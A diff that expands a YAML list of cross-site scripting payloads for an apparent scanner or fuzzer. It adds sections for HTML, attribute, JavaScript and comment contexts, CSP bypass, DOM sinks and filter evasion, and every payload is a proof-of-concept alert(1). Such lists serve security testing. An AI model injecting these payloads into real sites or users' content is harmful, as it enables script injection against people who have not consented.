@@ -11,6 +11,35 @@ html:
   - "<iframe src=javascript:alert(1)>"
   - "<input autofocus onfocus=alert(1)>"
   - "<math><mtext></table></math><img src=1 onerror=alert(1)>"
+  - "<video src=1 onerror=alert(1)>"
+  - "<audio src=1 onerror=alert(1)>"
+  - "<object data=javascript:alert(1)>"
+  - "<embed src=javascript:alert(1)>"
+  - "<link rel=import href=javascript:alert(1)>"
+  - "<table background=javascript:alert(1)>"
+  - "<div onmouseover=alert(1)>xss</div>"
+  - "<form action=javascript:alert(1)><input type=submit>"
+  - "<isindex type=image src=1 onerror=alert(1)>"
+  - "<img src=1 onerror=alert(1)>"
+  - "<body background=javascript:alert(1)>"
+  - "<marquee onstart=alert(1)>"
+  - "<a href=javascript:alert(1)>click</a>"
+  - "<p onmouseover=alert(1)>xss</p>"
+  - "<abbr title=javascript:alert(1)>xss</abbr>"
+  - "<button onclick=alert(1)>click</button>"
+  - "<fieldset onmouseover=alert(1)>xss</fieldset>"
+  - "<svg><script>alert(1)</script></svg>"
+  - "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+  - "<svg><set onbegin=alert(1) attributeName=x to=y>"
+  - "<svg><use href=\"data:image/svg+xml;base64,PHN2ZyBpZD0ncicgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayc+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg==#r\">"
+  - "<math href=javascript:alert(1)>xss</math>"
+  - "<template><script>alert(1)</script></template>"
+  - "<noscript><img src=x onerror=alert(1)></noscript>"
+  - "<xss onafterscriptexecute=alert(1)><script>1</script>"
+  - "<style>@import 'javascript:alert(1)'</style>"
+  - "<style>li {list-style-image: url(\"javascript:alert(1)\");}</style><ul><li>xss</li></ul>"
+  - "<picture><source srcset=\"javascript:alert(1)\" type=\"image/webp\"><img src=1>"
+  - "<meta http-equiv=refresh content=0;url=javascript:alert(1)>"
 
 attribute:
   - '" onfocus="alert(1)" autofocus="'
@@ -20,6 +49,41 @@ attribute:
   - "' onmouseover='alert(1)'"
   - '" onblur="alert(1)" tabindex="1" id="x'
   - "' onclick='alert(1)'"
+  - '" onkeydown="alert(1)"'
+  - '" onkeyup="alert(1)"'
+  - '" onkeypress="alert(1)"'
+  - '" onload="alert(1)"'
+  - '" onerror="alert(1)"'
+  - '" ondblclick="alert(1)"'
+  - '" oncontextmenu="alert(1)"'
+  - '" onwheel="alert(1)"'
+  - '" onmousedown="alert(1)"'
+  - '" onmouseup="alert(1)"'
+  - '" onmouseenter="alert(1)"'
+  - '" onmouseleave="alert(1)"'
+  - '" ontouchstart="alert(1)"'
+  - '" ontouchend="alert(1)"'
+  - '" onpointerdown="alert(1)"'
+  - '" oninput="alert(1)"'
+  - '" onchange="alert(1)"'
+  - '" onpaste="alert(1)"'
+  - '" oncut="alert(1)"'
+  - '" oncopy="alert(1)"'
+  - '" onscroll="alert(1)"'
+  - '" onresize="alert(1)"'
+  - "' oninput='alert(1)'"
+  - "' onchange='alert(1)'"
+  - "' onpaste='alert(1)'"
+  - "javascript:alert(1)"
+  - "javascript:alert(1)//"
+  - "javascript&#58;alert(1)"
+  - "jAvAsCrIpT:alert(1)"
+  - "&#106;avascript:alert(1)"
+  - "java&#9;script:alert(1)"
+  - "java&#10;script:alert(1)"
+  - "java&#13;script:alert(1)"
+  - "java\tscript:alert(1)"
+  - "java\nscript:alert(1)"
 
 js:
   - '";alert(1)//'
@@ -29,11 +93,42 @@ js:
   - '"-alert(1)-"'
   - "\\u0022;alert(1)//"
   - "\\x22;alert(1)//"
+  - '";alert(1);//'
+  - "';alert(1);//"
+  - '`-alert(1)-`'
+  - '${alert(1)}'
+  - '";alert(1);//'
+  - '\\x27;alert(1);//'
+  - '\\";alert(1);//'
+  - "');alert(1);//"
+  - '");alert(1);//'
+  - ']);alert(1);//'
+  - '});alert(1);//'
+  - '+alert(1)+'
+  - '|alert(1)|'
+  - '&alert(1)&'
+  - ';(alert)(1)//'
+  - ';[].constructor.constructor("alert(1)")()//'
+  - ';Function("alert(1)")()//'
+  - ';eval("alert(1)")//'
+  - ';setTimeout("alert(1)")//'
+  - ';setInterval("alert(1)",9999999)//'
+  - '";window["al"+"ert"](1)//'
+  - '";(1,eval)("alert(1)")//'
+  - '";location="javascript:alert(1)"//'
 
 comment:
   - "--><script>alert(1)</script><!--"
   - "--><img src=x onerror=alert(1)><!--"
   - "--></comment><script>alert(1)</script>"
+  - "*/alert(1)/*"
+  - "*/</script><script>alert(1)</script>/*"
+  - "--></title><script>alert(1)</script>"
+  - "--></textarea><script>alert(1)</script>"
+  - "--></style><script>alert(1)</script>"
+  - "]]></style><script>alert(1)</script>"
+  - "]]><script>alert(1)</script>"
+  - "?><script>alert(1)</script>"
 
 unknown:
   - '"><script>alert(1)</script>'
@@ -42,3 +137,67 @@ unknown:
   - "<ScRiPt>alert(1)</ScRiPt>"
   - "<img/src=1 onerror=alert(1)>"
   - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+  - "%3Cscript%3Ealert(1)%3C/script%3E"
+  - "%3Cimg%20src=x%20onerror=alert(1)%3E"
+  - "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+  - "&lt;script&gt;alert(1)&lt;/script&gt;"
+  - "<scr\x00ipt>alert(1)</scr\x00ipt>"
+  - "<scr\tipt>alert(1)</scr\tipt>"
+  - "<scr\nipt>alert(1)</scr\nipt>"
+
+csp_bypass:
+  - "<script src=data:,alert(1)>"
+  - "<script src=//ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js></script><script>$.getScript('data:,alert(1)')</script>"
+  - "<script>location='javascript:alert(1)'</script>"
+  - "<base href=javascript:alert(1)><a href=.>click</a>"
+  - "<meta http-equiv=Content-Security-Policy content=\"\">"
+  - "<link rel=preload as=script href=data:,alert(1)>"
+  - "<script>import('data:text/javascript,alert(1)')</script>"
+  - "<iframe srcdoc='<script>parent.alert(1)</script>'>"
+  - "<object data=\"data:text/html,<script>alert(1)</script>\">"
+  - "<form action='javascript:alert(1)'><input type=submit value=XSS></form>"
+  - "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>"
+
+dom_sink:
+  - "#<img src=x onerror=alert(1)>"
+  - "#\"><img src=x onerror=alert(1)>"
+  - "#javascript:alert(1)"
+  - "?x=<script>alert(1)</script>"
+  - "?x=\"><img src=x onerror=alert(1)>"
+  - "?redirect=javascript:alert(1)"
+  - "?next=javascript:alert(1)"
+  - "#alert(1)"
+  - "?search=<svg onload=alert(1)>"
+  - "?name=</script><script>alert(1)</script>"
+  - "?url=javascript:void(alert(1))"
+  - "?callback=alert"
+
+filter_evasion:
+  - "<sCrIpT>alert(1)</sCrIpT>"
+  - "<SCRIPT>alert(1)</SCRIPT>"
+  - "<img SRC=x oneRRor=alert(1)>"
+  - "<IMG SRC=x ONERROR=alert(1)>"
+  - "<svg/onload=alert(1)>"
+  - "<svg onload\r=alert(1)>"
+  - "<svg onload\t=alert(1)>"
+  - "<svg onload\n=alert(1)>"
+  - "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">"
+  - "<img src=x onerror=\\u0061lert(1)>"
+  - "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+  - "<img src=x onerror=alert`1`>"
+  - "<img src=x onerror=alert(String.fromCharCode(49))>"
+  - "<script>\\u0061lert(1)</script>"
+  - "<script>\\x61lert(1)</script>"
+  - "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>"
+  - "<script>al\\u0065rt(1)</script>"
+  - "<%2Fscript><script>alert(1)<%2Fscript>"
+  - "<script>alert(1)<!--"
+  - "<script><!--alert(1)//--></script>"
+  - "<scrscriptipt>alert(1)</scrscriptipt>"
+  - "<img src=!@#$%^&*()_+ onerror=alert(1)>"
+  - "<img src=`x` onerror=alert(1)>"
+  - "<img src=' ' onerror=alert(1)>"
+  - "<img src=. onerror=alert(1)>"
+  - "<svg><script>&#97;lert(1)</script></svg>"
+  - "<div id=\"x\" onmouseover=\"alert(1)\">hover</div>"
+  - "<style>*[href^='javascript']{color:red}</style><a href=javascript:alert(1)>xss</a>"
